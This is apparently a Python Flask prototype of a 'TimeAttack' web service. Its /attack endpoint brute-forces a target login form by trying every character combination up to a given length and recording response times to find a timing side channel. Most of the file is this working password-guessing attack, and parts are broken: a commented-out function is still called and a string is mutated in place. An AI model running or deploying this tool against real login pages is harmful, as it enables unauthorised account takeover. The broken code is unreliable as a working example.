from flask import Flask, request, send_file, jsonify
from flask_restplus import Resource, Api, reqparse, fields
from flask_cors import CORS

import numpy as np

from werkzeug.exceptions import BadRequest

#from celery import Celery

import time
import os
import json
import requests
import time
from string import digits, ascii_uppercase, ascii_lowercase
from itertools import product

chars = digits + ascii_uppercase + ascii_lowercase

def password_generator(digits):
    for n in range(1, digits + 1):
        for comb in product(chars, repeat=n):
            yield(''.join(comb))


def primary_attack(address, digits, username):
    """ address = address of the target device
        digits = how many digits in the password
        username = what username to use in the attack
    """
    elapsed_time = 0
    timings = []
    data = {}
    passwords = password_generator(digits)
    for password in passwords:
        start = time.perf_counter()
        req = requests.post(address, data={'username':username, 'password':password})
        end = time.perf_counter()
        elapsed_time = end - start
        data['time'] = elapsed_time
        data['resp'] = req.status_code
        data['password'] = password
        timings.append(data)
        if req.ok == True:
            return timings
        data = {}


def check_vulnerable(timings):
    times = [timing['time'] for timing in timings]
    passwords = [timing['password'] for timing in timings]
    corr_time = [timing['time'] for timing in timings if timing['resp'] == 201]
    corr_passw = [timing['password'] for timing in timings if timing['resp'] == 201]
    mean = np.mean(times)
    print('correct password was {0:.4f} ms faster'.format(float(mean - corr_time[0])*1000))
    return(mean, corr_passw)

"""
def precise_test(address, correct_passw, username):
    times = []
    results = []
    for x in range(10):
        passw = correct_passw
        for idx, char in reversed(list(enumerate(passw))):
            start = time.perf_counter()
            req = requests.post(address, data={'username':username, 'password':passw})
            end = time.perf_counter()
            times.append(end-start)
            print(idx)
            print(char)
            passw[idx] = chr((ord(passw[idx]))+1)
        results.append(times)
        times = []
    return(results)
"""


def create_app():
    app = Flask(__name__)
    CORS(app)
    api = Api(app)

    parser = reqparse.RequestParser()
    parser.add_argument('resultid', action='append', type=str, help='ID of the result')
    ns = api.namespace('TimeAttack', description='Timing attack operations')

    params = api.model('Params', {
        'address': fields.String(required=True, description='Attack target address'),
        'digits': fields.Integer(required=True, description='Number of digits in the password to be brute forced'),
        'username': fields.String(required=True, description='Username to attack')
    })


    @ns.route('/attack')
    class Attacks(Resource):
        """ This endpoint initiates an attack """
        @ns.doc('post attack parameters and initiate attack')
        @ns.expect(params)
        @ns.marshal_with(params)
        def post(self):
            test = []
            data = api.payload
            address = data['address']
            digits = data['digits']
            username = data['username']
            correct_passw = ""
            for x in range(5):
                timings = primary_attack(address, digits, username)
                res, correct_passw = check_vulnerable(timings)
                test.append(res)
            print(np.mean(test))
            print('Results: correct password is {0:.4f} ms faster than average of all results'.format(float(np.mean(test))))
            prec = precise_test(address, correct_passw, username)
            print(prec)
            return(np.mean(test))


    @ns.route('/results')
    class Results(Resource):
        """ This endpoint returns results """
        @ns.doc('fetch results')
        def get(self):
            #return results
            return('results')


    @ns.route('/results/<string:resultid>')
    class Result(Resource):
        """ This endpoint returns a single result """
        @ns.doc('fetch a single result')
        def get(self):
            #return the correct result
            return('result')

    return app


if __name__ == '__main__':
    app = create_app()
    app.run(debug=True)
